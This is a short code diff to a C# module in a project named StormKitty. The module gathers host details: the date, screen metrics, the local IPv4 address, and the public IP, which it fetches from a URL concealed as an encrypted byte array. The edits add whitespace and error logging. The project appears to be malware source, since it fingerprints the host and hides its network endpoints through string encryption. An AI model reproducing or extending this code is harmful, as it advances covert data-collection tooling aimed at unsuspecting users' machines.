@@ -28,6 +28,7 @@ namespace StormKitty
         // Current date
         public static string datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");
 
+
         // Get screen metrics
         public static string ScreenMetrics()
         {
@@ -150,7 +151,6 @@ namespace StormKitty
                     if (ip.AddressFamily == AddressFamily.InterNetwork)
                         return ip.ToString();
             } catch { }
-
             return "No network adapters with an IPv4 address in the system!";
         }
 
@@ -164,7 +164,7 @@ namespace StormKitty
                     StringsCrypt.Decrypt(new byte[] { 172, 132, 62, 84, 188, 245, 252, 173, 117, 82, 97, 91, 237, 238, 214, 39, 28, 15, 241, 23, 15, 251, 204, 131, 247, 237, 166, 92, 82, 85, 22, 172, }))
                 .Replace("\n", "");
                 return externalip;
-            } catch { }
+            } catch (Exception ex) { Logging.Log("SystemInfo >> GetPublicIP : Request error\n" + ex); }
             return "Request failed";
         }
 
